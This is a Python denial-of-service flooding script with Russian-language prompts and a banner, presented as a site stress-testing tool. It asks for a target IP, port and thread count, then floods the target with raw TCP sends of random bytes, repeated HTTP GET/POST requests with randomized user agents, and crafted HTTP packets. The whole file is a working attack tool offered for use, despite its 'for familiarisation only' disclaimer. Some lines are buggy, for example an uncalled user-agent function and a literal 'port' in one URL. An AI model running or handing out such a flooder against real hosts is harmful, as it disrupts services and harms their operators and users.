#!/usr/bin/python3
# -*- coding:utf-8 -*-
"""Небольшой скрипт на Python для проведения тестирования сайта на DDoS/DoS атаки
Copyright (C) 2023  Okulus Dev
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>."""
import random
import threading
from time import sleep
import sys
import socket
import requests
from scapy.all import *
from fake_useragent import UserAgent


def generate_useragent() -> str:
	fua = UserAgent()

	return str(fua.random)


def down_it(ip, port, packets):
	count = 0
	while count <= packets:
		count += 1
		try:
			packet = str(f"GET / HTTP/1.1\nHost: {ip}\n\n User-Agent: {generate_useragent}\nIFA").encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip, port))

			if s.sendto(packet, (ip, port)):
				s.shutdown(1)
			else:
				s.shutdown(1)
			sleep(.1)
		except socket.error as e:
			print(f'[!] {e}')
		except KeyboardInterrupt:
			print('Конец атаки')
			return


def requesting(ip, port, packets):
	bb = int(0)

	while True:
		try:
			for i in range(packets):
				headers = {
					'User-Agent': generate_useragent()
				}
				requests.get(f'http://{ip}:{port}/', headers=headers)
				requests.post(f'http://{ip}:port/', headers=headers)
				print(f'[{ip}:{port}] отправлено пакетов: {bb}')

			print(f'[{ip}:{port}] всего отправлено пакетов: {bb}')
		except KeyboardInterrupt:
			print('[+] Конец атаки')
			return


def syn(ip, port, packets):
	hevin = random._urandom(900)
	bb = int(0)

	while True:
		try:
			h = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			h.connect((ip, port))
			h.send(hevin)

			for i in range(packets):
				h.send(hevin)
				bb += 1
				print(f'[{ip}:{port}] отправлено пакетов: {bb}')

			print(f'[{ip}:{port}] всего отправлено пакетов: {bb}')
		except KeyboardInterrupt:
			h.close()
			print('[+] Конец атаки')
			return


def main():
	print('''
 DDDDDDDDDDDDD
 D::::::::::::D
 DDD:::DDDDD:::D
   D:::D    D:::D  ___    __    _  ___ ___
   D:::D     D:::D |  \\  /  \\  /   |   | /
   D:::D     D:::D |  |  |  |  \\_  |-- |\\
   D:::D     D:::D |_/   \\__/  _/  |__ | \\
   D:::D    D:::D
 DDD:::DDDDD:::D
 D::::::::::::D
 DDDDDDDDDDDDD    With Love by Okulus Dev      

[!] Внимание! Все показано в качестве ознакомления!
		''')
	print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿')

	ip = str(input('[+] IP адрес: '))
	port = int(input('[+] Порт: '))
	packets = int(input('[+] Количество пакетов: '))
	threads = int(input('[+] Количество потоков: '))

	sleep(1)

	for i in range(threads):
		thread = threading.Thread(target=lambda: syn(ip, port, packets))
		thread.start()
		thread2 = threading.Thread(target=lambda: requesting(ip, port, packets))
		thread2.start()
		print(f'[+] Запуск {i} потока!')

	print('\n\nАтака закончена\nПодписывайся на @OkulusHub в телеграме')


if __name__ == '__main__':
	main()
